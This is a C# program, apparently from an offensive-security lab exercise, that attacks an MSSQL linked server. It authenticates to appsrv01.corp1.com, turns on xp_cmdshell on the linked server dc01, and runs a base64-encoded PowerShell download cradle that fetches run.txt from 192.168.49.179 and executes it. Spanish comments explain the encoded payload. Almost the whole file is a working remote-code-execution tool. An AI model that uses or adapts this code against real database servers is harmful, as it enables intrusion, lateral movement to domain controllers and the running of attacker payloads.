using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQL___Linked_Servers_xp_cmdshell
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            //Authenticates
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }


            //Enabling xp_cmdshell
            String enable_avoptions = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT dc01";
            String enable_xpcmd = "EXEC ('sp_configure ''xp_cmdshell'',1;') AT dc01";

            //Este funciona bien
            // Es "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/run.txt') | IEX" en  codigo b64. Ver ejercicio 15.1.3 -> encodecradle.ps1 
            String execCmd = "EXEC ('xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'';') AT dc01";
            //Este funciona mal
            //String execCmd = "EXEC ('xp_cmdshell ''powershell IEX((New-Object System.Net.WebClient).DownloadString(''http://192.168.49.179/run.txt''))''') AT dc01";


            //Execute enable_avoptions
            SqlCommand command = new SqlCommand(enable_avoptions, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            //Execute enable_xpcmd
            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Execute execCmd
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();

            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}